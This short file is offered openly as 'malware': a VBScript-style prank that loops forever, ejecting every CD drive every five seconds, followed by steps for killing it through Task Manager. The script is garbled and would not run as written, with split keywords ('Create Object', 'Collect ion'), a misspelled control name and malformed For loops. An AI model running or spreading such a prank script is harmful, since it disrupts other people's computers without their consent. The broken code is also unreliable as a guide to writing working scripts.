# This Malware Will continuously eject drive
Set OWMP =
Create Object("WMP layer.OCX7")
Set colCDROM=OWMP.cdrom Collect ion
do
if col CDROMsCount>=1 then
For i=0 to colCDROMs.item(i).Eject
Next
For i=0 to colCDROMs.Item(i).Eject
Next
End if
wscript.sleep5000
loop

# To stop this not a code do it manually
# Open task manger
# process tab
# end the process [wscript.exe file]

